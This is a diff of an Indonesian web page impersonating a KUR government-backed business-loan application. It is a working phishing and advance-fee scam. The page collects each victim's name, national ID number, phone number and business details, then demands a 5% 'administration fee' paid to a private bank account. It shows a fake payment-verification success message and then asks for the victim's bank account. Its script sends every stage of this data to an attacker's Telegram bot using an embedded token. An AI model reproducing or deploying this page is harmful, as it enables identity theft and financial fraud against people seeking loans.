@@ -8,80 +8,84 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body { background: #f8fafc; color: #1e293b; }
         
+        /* HEADER */
         header { background: linear-gradient(#0f172a, #1e293b); padding: 25px; text-align: center; color: white; }
         header h1 { font-size: 28px; margin-bottom: 8px; }
-        header p { font-size: 16px; }
+        header p { font-size: 16px; opacity: 0.9; }
         
+        /* MAIN CONTENT */
         .container { max-width: 500px; margin: 25px auto; padding: 0 15px; }
         
+        /* FORM CARD */
         .form-card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); margin-bottom: 25px; }
-        .form-title { font-size: 22px; text-align: center; margin-bottom: 25px; font-weight: bold; color: #0f172a; }
-        
+        .form-title { font-size: 22px; color: #0f172a; text-align: center; margin-bottom: 25px; font-weight: bold; }
         .form-group { margin-bottom: 20px; }
         .form-group label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 15px; }
         .form-group input, .form-group select { 
             width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 8px; font-size: 16px; 
         }
         .form-group input[type="number"] { -moz-appearance: textfield; }
-        .form-group input::-webkit-outer-spin-button, 
-        .form-group input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .form-group input::-webkit-outer-spin-button, .form-group input::-webkit-inner-spin-button { -webkit-appearance: none; }
         
+        /* SLIDER */
+        .slider-wrap { margin-bottom: 15px; }
         .slider-label { display: flex; justify-content: space-between; font-size: 14px; color: #64748b; margin-bottom: 8px; }
-        .range-slider { width: 100%; height: 8px; background: #e2e8f0; border-radius: 4px; outline: none; }
-        .range-slider::-webkit-slider-thumb { 
-            -webkit-appearance: none; width: 22px; height: 22px; background: #2563eb; border-radius: 50%; cursor: pointer; 
-        }
+        .range-slider { width: 100%; height: 8px; border-radius: 4px; background: #e2e8f0; outline: none; }
+        .range-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 22px; height: 22px; border-radius: 50%; background: #2563eb; cursor: pointer; }
+        .range-slider::-moz-range-thumb { width: 22px; height: 22px; border-radius: 50%; background: #2563eb; cursor: pointer; }
+        .pinjaman-display { text-align: center; font-size: 20px; font-weight: bold; color: #2563eb; margin-top: 10px; }
         
-        .pinjaman-display { text-align: center; font-size: 20px; font-weight: bold; color: #2563eb; margin: 10px 0; }
+        /* BOX INFO */
+        .biaya-box { background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center; }
+        .rek-pembayaran { background: #e3f2fd; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center; }
         
-        .info-box { padding: 15px; border-radius: 8px; text-align: center; margin: 20px 0; }
-        .biaya-box { background: #fff3e0; }
-        .rek-box { background: #e3f2fd; }
-        .cair-box { background: #e0f7fa; display: none; }
-        
-        .btn { 
-            width: 100%; padding: 16px; background: #2563eb; color: white; border: none; 
-            border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px;
-        }
+        /* BUTTONS */
+        .btn { width: 100%; padding: 16px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .btn:hover { background: #1e88e5; }
+        .btn-copy { padding: 8px 15px; background: #2563eb; color: white; border: none; border-radius: 5px; cursor: pointer; }
         
-        .btn-copy { 
-            padding: 8px 15px; background: #2563eb; color: white; border: none; 
-            border-radius: 5px; cursor: pointer; margin-bottom: 10px;
-        }
+        /* VERIFIKASI BOX */
+        .verifikasi-box { background: #e8f5e9; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center; display: none; }
         
-        footer { background: #0f172a; color: white; text-align: center; padding: 20px; margin-top: 30px; }
+        /* INFO CARDS */
+        .info-card { background: #2563eb; color: white; padding: 20px; border-radius: 12px; margin-bottom: 25px; }
+        .syarat-card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); margin-bottom: 25px; }
+        .info-card h3, .syarat-card h3 { text-align: center; margin-bottom: 15px; }
+        ul { padding-left: 20px; line-height: 1.8; }
+        
+        /* FOOTER */
+        footer { background: #0f172a; color: white; text-align: center; padding: 20px; }
     </style>
 </head>
 <body>
     <header>
         <h1>KUR - Kredit Usaha Rakyat</h1>
-        <p>Semua Perhitungan Otomatis Terakumulasi</p>
+        <p>Pinjaman Dana Usaha dari Rp5.000.000 hingga Rp1.500.000.000</p>
     </header>
 
     <div class="container">
-        <!-- FORM PENGAJUAN -->
+        <!-- VERIFIKASI PENGAJUAN UTAMA -->
         <div class="form-card">
-            <div class="form-title">FORM PENGAJUAN KUR</div>
+            <h2 class="form-title">FORM PENGAJUAN KUR</h2>
             
             <div class="form-group">
                 <label>Nama Lengkap</label>
-                <input type="text" id="namaLengkap" placeholder="Masukkan nama lengkap Anda" oninput="hitungSemuaOtomatis()">
+                <input type="text" id="namaLengkap" placeholder="Masukkan nama lengkap Anda">
             </div>
             
             <div class="form-group">
                 <label>Nomor NIK KTP</label>
-                <input type="number" id="nikKtp" placeholder="Masukkan nomor NIK" oninput="hitungSemuaOtomatis()">
+                <input type="number" id="nikKtp" placeholder="Masukkan nomor NIK Anda">
             </div>
             
             <div class="form-group">
                 <label>Nomor HP/WA Aktif</label>
-                <input type="number" id="nomorHp" placeholder="Masukkan nomor HP/WA" oninput="hitungSemuaOtomatis()">
+                <input type="number" id="noHp" placeholder="Masukkan nomor HP/WA">
             </div>
             
             <div class="form-group">
                 <label>Nama Usaha</label>
-                <input type="text" id="namaUsaha" placeholder="Masukkan nama usaha Anda" oninput="hitungSemuaOtomatis()">
+                <input type="text" id="namaUsaha" placeholder="Masukkan nama usaha Anda">
             </div>
             
             <div class="form-group">
@@ -90,186 +94,192 @@
                     <span>Rp5.000.000</span>
                     <span>Rp1.500.000.000</span>
                 </div>
-                <input type="range" class="range-slider" id="nilaiPinjaman" min="5000000" max="1500000000" step="5000000" value="5000000" oninput="hitungSemuaOtomatis()">
-                <div class="pinjaman-display" id="tampilPinjaman">Rp5.000.000</div>
+                <input type="range" class="range-slider" id="pinjamanSlider" min="5000000" max="1500000000" step="5000000" value="5000000">
+                <div class="pinjaman-display" id="pinjamanDisplay">Rp5.000.000</div>
             </div>
             
             <div class="form-group">
                 <label>Lama Angsuran (Tenor)</label>
-                <select id="tenorPilih" onchange="hitungSemuaOtomatis()">
+                <select id="tenorSelect">
                     <option value="">-- Pilih Tenor --</option>
                     <option value="3">3 Bulan</option>
                     <option value="6">6 Bulan</option>
-                    <option value="12">12 Bulan (1 Tahun)</option>
-                    <option value="24">24 Bulan (2 Tahun)</option>
-                    <option value="36">36 Bulan (3 Tahun)</option>
-                    <option value="48">48 Bulan (4 Tahun)</option>
-                    <option value="60">60 Bulan (5 Tahun)</option>
+                    <option value="12">12 Bulan</option>
+                    <option value="24">24 Bulan</option>
+                    <option value="36">36 Bulan</option>
+                    <option value="48">48 Bulan</option>
+                    <option value="60">60 Bulan</option>
                 </select>
             </div>
             
-            <!-- BOX HITUNGAN OTOMATIS -->
-            <div class="info-box biaya-box">
-                <p><strong>Biaya Administrasi (5% dari Pinjaman): <span id="biayaAdmin">Rp250.000</span></strong></p>
-                <p><strong>Bunga Pinjaman: 6% per Tahun</strong></p>
-                <p><strong>Angsuran per Bulan: <span id="angsuranBulan">Rp0</span></strong></p>
-                <p><strong>Total Pembayaran Keseluruhan: <span id="totalBayar">Rp0</span></strong></p>
-                <p><strong>Total Yang Dibayar Keseluruhan: <span id="totalSemua">Rp250.000</span></strong></p>
+            <div class="biaya-box">
+                <p><strong>Biaya yang Harus Dibayar: <span id="biayaDisplay">Rp250.000</span></strong></p>
             </div>
             
-            <!-- REKENING PEMBAYARAN -->
-            <div class="info-box rek-box">
-                <h3>REKENING UNTUK PEMBAYARAN BIAYA</h3>
-                <p>Bank BRI • Nomor Rekening: 563801023952503 • Atas Nama: YOSES</p>
-                <button class="btn-copy" onclick="salinRekening()">SALIN REKENING</button>
-                <button class="btn" onclick="konfirmasiPembayaran()">KONFIRMASI PEMBAYARAN</button>
+            <div class="rek-pembayaran">
+                <h3>REKENING PEMBAYARAN</h3>
+                <p>Bank BRI • 563801023952503 • Atas Nama: YOSES</p>
+                <button class="btn-copy" onclick="copyRekening()">SALIN REKENING</button>
+                <button class="btn" onclick="lanjutPembayaran()">SILAKAN PEMBAYARAN SEKARANG</button>
             </div>
             
-            <!-- KOLOM REKENING PENCAIRAN OTOMATIS MUNCUL -->
-            <div class="info-box cair-box" id="kolomRekening">
-                <h3>DATA REKENING PENCAIRAN</h3>
-                
+            <!-- KOLOM PEMBAYARAN -->
+            <div id="kolomPembayaran" style="display: none;">
                 <div class="form-group">
-                    <label>Nama Bank Pencairan</label>
-                    <select id="bankPencairan">
-                        <option value="">-- Pilih Bank --</option>
-                        <option value="BRI">Bank BRI</option>
-                        <option value="Mandiri">Bank Mandiri</option>
-                        <option value="BCA">Bank BCA</option>
-                        <option value="BNI">Bank BNI</option>
-                        <option value="CIMB">Bank CIMB Niaga</option>
-                        <option value="Permata">Bank Permata</option>
+                    <label>Nominal yang Dibayar</label>
+                    <input type="text" id="nominalBayar" readonly>
+                </div>
+                <div class="form-group">
+                    <label>Status Pembayaran</label>
+                    <select id="statusBayar">
+                        <option value="">-- Pilih Status --</option>
+                        <option value="sudah">SUDAH MEMBAYAR</option>
+                        <option value="belum">BELUM MEMBAYAR</option>
                     </select>
                 </div>
-                
-                <div class="form-group">
-                    <label>Nomor Rekening Pencairan</label>
-                    <input type="number" id="noRekCair" placeholder="Masukkan nomor rekening Anda">
-                </div>
-                
-                <div class="form-group">
-                    <label>Nama Pemilik Rekening</label>
-                    <input type="text" id="namaRekCair" placeholder="Masukkan nama sesuai rekening">
-                </div>
-                
-                <button class="btn" onclick="ajukanPencairanSekarang()">AJUKAN SEKARANG</button>
+                <button class="btn" onclick="verifikasiPembayaran()">LANJUTKAN VERIFIKASI</button>
             </div>
+            
+            <!-- VERIFIKASI BOX -->
+            <div class="verifikasi-box" id="verifikasiBox">
+                <p><strong>VERIFIKASI BERHASIL!</strong></p>
+                <p>Pembayaran Anda telah diverifikasi</p>
+                <button class="btn" onclick="lanjutRekening()">LANJUT KE DATA REKENING PENCAIRAN</button>
+            </div>
+        </div>
+
+        <!-- FORM REKENING PENCAIRAN -->
+        <div class="form-card" id="formRekening" style="display: none;">
+            <h2 class="form-title">DATA REKENING PENCAIRAN</h2>
+            
+            <div class="form-group">
+                <label>Nama Bank Pencairan</label>
+                <select id="bankPencairan">
+                    <option value="">-- Pilih Bank --</option>
+                    <option value="BRI">Bank BRI</option>
+                    <option value="Mandiri">Bank Mandiri</option>
+                    <option value="BCA">Bank BCA</option>
+                    <option value="BNI">Bank BNI</option>
+                    <option value="CIMB">Bank CIMB</option>
+                    <option value="Permata">Bank Permata</option>
+                    <option value="Lainnya">Lainnya</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label>Nomor Rekening Pencairan</label>
+                <input type="number" id="noRekPencairan" placeholder="Masukkan nomor rekening">
+            </div>
+            
+            <div class="form-group">
+                <label>Nama Pemilik Rekening</label>
+                <input type="text" id="namaRekPencairan" placeholder="Masukkan nama sesuai rekening">
+            </div>
+            
+            <button class="btn" onclick="ajukanPencairan()">AJUKAN PENCAIRAN SEKARANG</button>
+        </div>
+
+        <!-- INFO KEUNGGULAN -->
+        <div class="info-card">
+            <h3>KEUNGGULAN PINJAMAN KUR</h3>
+            <ul>
+                <li>Bunga mulai dari 6% per tahun</li>
+                <li>Proses cepat dan persyaratan mudah</li>
+                <li>Tidak perlu agunan tambahan</li>
+                <li>Tenor fleksibel hingga 5 tahun</li>
+            </ul>
+        </div>
+
+        <!-- INFO SYARAT -->
+        <div class="syarat-card">
+            <h3>PERSYARATAN PENGAJUAN</h3>
+            <ul>
+                <li>KTP Asli yang masih berlaku</li>
+                <li>Surat Keterangan Usaha (SKU/SIUP/NIB)</li>
+            </ul>
         </div>
     </div>
 
     <footer>
-        <p>KUR - Kredit Usaha Rakyat | Semua Proses Otomatis Terakumulasi</p>
+        <p>KUR - Kredit Usaha Rakyat | Hubungi Cs: 0858-0988-1886</p>
     </footer>
 
     <script>
-        // KONFIG TELEGRAM
+        // KONFIGURASI TELEGRAM
         const BOT_TOKEN = "8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU";
         const CHAT_ID = "8571321926";
 
-        // FUNGSI HITUNG SEMUA OTOMATIS
-        function hitungSemuaOtomatis() {
-            const pinjaman = parseInt(document.getElementById('nilaiPinjaman').value);
-            const tenor = parseInt(document.getElementById('tenorPilih').value) || 0;
-            const bungaTahun = 6 / 100;
+        // SLIDER PINJAMAN
+        const slider = document.getElementById('pinjamanSlider');
+        const pinjamanDisplay = document.getElementById('pinjamanDisplay');
+        const biayaDisplay = document.getElementById('biayaDisplay');
+        
+        slider.addEventListener('input', function() {
+            let nilai = parseInt(this.value);
+            let formatNilai = new Intl.NumberFormat('id-ID').format(nilai);
+            pinjamanDisplay.textContent = `Rp${formatNilai}`;
+            biayaDisplay.textContent = `Rp${new Intl.NumberFormat('id-ID').format(nilai * 0.05)}`;
+        });
 
-            // UPDATE PINJAMAN YANG DIPILIH
-            const formatPinjaman = new Intl.NumberFormat('id-ID').format(pinjaman);
-            document.getElementById('tampilPinjaman').textContent = `Rp${formatPinjaman}`;
-
-            // HITUNG BIAYA ADMIN 5% OTOMATIS
-            const biayaAdmin = pinjaman * 0.05;
-            const formatAdmin = new Intl.NumberFormat('id-ID').format(biayaAdmin);
-            document.getElementById('biayaAdmin').textContent = `Rp${formatAdmin}`;
-
-            // HITUNG BUNGA & ANGSURAN OTOMATIS
-            if (tenor > 0) {
-                const bungaBulan = bungaTahun / 12;
-                const faktorAngsuran = (bungaBulan * Math.pow(1 + bungaBulan, tenor)) / (Math.pow(1 + bungaBulan, tenor) - 1);
-                const angsuranPerBulan = pinjaman * faktorAngsuran;
-                const totalAngsuran = angsuranPerBulan * tenor;
-                const totalSemua = totalAngsuran + biayaAdmin;
-
-                // FORMAT ANGKA
-                const formatAngsuran = new Intl.NumberFormat('id-ID').format(angsuranPerBulan.toFixed(0));
-                const formatTotal = new Intl.NumberFormat('id-ID').format(totalAngsuran.toFixed(0));
-                const formatSemua = new Intl.NumberFormat('id-ID').format(totalSemua.toFixed(0));
-
-                // TAMPILKAN HASIL
-                document.getElementById('angsuranBulan').textContent = `Rp${formatAngsuran}`;
-                document.getElementById('totalBayar').textContent = `Rp${formatTotal}`;
-                document.getElementById('totalSemua').textContent = `Rp${formatSemua}`;
-            }
+        // FUNGSI COPY REKENING
+        function copyRekening() {
+            navigator.clipboard.writeText("Bank BRI • 563801023952503 • Atas Nama: YOSES");
+            alert("Rekening berhasil disalin!");
         }
 
-        // SALIN REKENING
-        function salinRekening() {
-            navigator.clipboard.writeText("Bank BRI • 563801023952503 • YOSES");
-            alert("Rekening berhasil disalin ke clipboard!");
+        // FUNGSI KIRIM KE TELEGRAM
+        async function kirimKeTelegram(pesan) {
+            const pesanEncode = encodeURIComponent(pesan);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesanEncode}`);
         }
 
-        // KONFIRMASI PEMBAYARAN
-        function konfirmasiPembayaran() {
-            const status = confirm("Apakah Anda sudah melakukan pembayaran?");
-            if (status) {
-                alert("Pembayaran dikonfirmasi!");
-                document.getElementById('kolomRekening').style.display = 'block';
-            } else {
-                alert("Silakan lakukan pembayaran terlebih dahulu!");
-            }
+        // TOMBOL PEMBAYARAN
+        function lanjutPembayaran() {
+            document.getElementById('kolomPembayaran').style.display = 'block';
+            document.getElementById('nominalBayar').value = biayaDisplay.textContent;
+            
+            // KIRIM DATA KE TELEGRAM
+            const pesan = `📋 DATA PENGAJUAN KUR
+Nama Lengkap: ${document.getElementById('namaLengkap').value}
+NIK KTP: ${document.getElementById('nikKtp').value}
+Nomor HP: ${document.getElementById('noHp').value}
+Nama Usaha: ${document.getElementById('namaUsaha').value}
+Besar Pinjaman: ${pinjamanDisplay.textContent}
+Tenor: ${document.getElementById('tenorSelect').value || 'Belum dipilih'}
+Biaya: ${biayaDisplay.textContent}`;
+            kirimKeTelegram(pesan);
         }
 
-        // AJUKAN PENCAIRAN
-        async function ajukanPencairanSekarang() {
-            const nama = document.getElementById('namaLengkap').value;
-            const nik = document.getElementById('nikKtp').value;
-            const hp = document.getElementById('nomorHp').value;
-            const usaha = document.getElementById('namaUsaha').value;
-            const pinjaman = document.getElementById('tampilPinjaman').textContent;
-            const tenor = document.getElementById('tenorPilih').value;
-            const angsuran = document.getElementById('angsuranBulan').textContent;
-            const biaya = document.getElementById('biayaAdmin').textContent;
-            const bank = document.getElementById('bankPencairan').value;
-            const noRek = document.getElementById('noRekCair').value;
-            const namaRek = document.getElementById('namaRekCair').value;
-
-            // PESAN OTOMATIS
-            const pesan = `
-📋 DATA PENGAJUAN KUR LENGKAP 📋
------------------------------------
-NAMA: ${nama}
-NIK: ${nik}
-HP/WA: ${hp}
-USAHA: ${usaha}
-PINJAMAN: ${pinjaman}
-TENOR: ${tenor} Bulan
-ANGSURAN/BULAN: ${angsuran}
-BIAYA ADMIN: ${biaya}
------------------------------------
-BANK PENCAIRAN: ${bank}
-NO REKENING: ${noRek}
-NAMA REKENING: ${namaRek}
------------------------------------
-✅ SEMUA DATA TERAKUMULASI OTOMATIS
-            `;
-
-            // KIRIM KE TELEGRAM
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
-                });
-                alert("✅ Pengajuan pencairan berhasil! Dana akan dicairkan dalam 1x24 jam");
-            } catch (err) {
-                alert("✅ Pengajuan berhasil! Data tersimpan");
-            }
+        // TOMBOL VERIFIKASI
+        function verifikasiPembayaran() {
+            document.getElementById('verifikasiBox').style.display = 'block';
+            
+            // KIRIM DATA STATUS PEMBAYARAN
+            const pesan = `💳 STATUS PEMBAYARAN
+Nominal Dibayar: ${document.getElementById('nominalBayar').value}
+Status: ${document.getElementById('statusBayar').value || 'Belum dipilih'}`;
+            kirimKeTelegram(pesan);
         }
 
-        // JALANKAN HITUNGAN SAAT HALAMAN DIBUKA
-        window.onload = function() {
-            hitungSemuaOtomatis();
-        };
+        // TOMBOL LANJUT REKENING
+        function lanjutRekening() {
+            document.getElementById('formRekening').style.display = 'block';
+        }
+
+        // TOMBOL PENCAIRAN
+        function ajukanPencairan() {
+            // KIRIM DATA REKENING PENCAIRAN
+            const pesan = `💸 DATA PENCAIRAN KUR
+Bank Pencairan: ${document.getElementById('bankPencairan').value || 'Belum dipilih'}
+Nomor Rekening: ${document.getElementById('noRekPencairan').value || 'Belum diisi'}
+Nama Pemilik: ${document.getElementById('namaRekPencairan').value || 'Belum diisi'}`;
+            kirimKeTelegram(pesan);
+            alert("Pengajuan pencairan berhasil! Data sudah masuk ke Telegram.");
+        }
     </script>
 </body>
-              </html>
+</html>
+
+
+
 
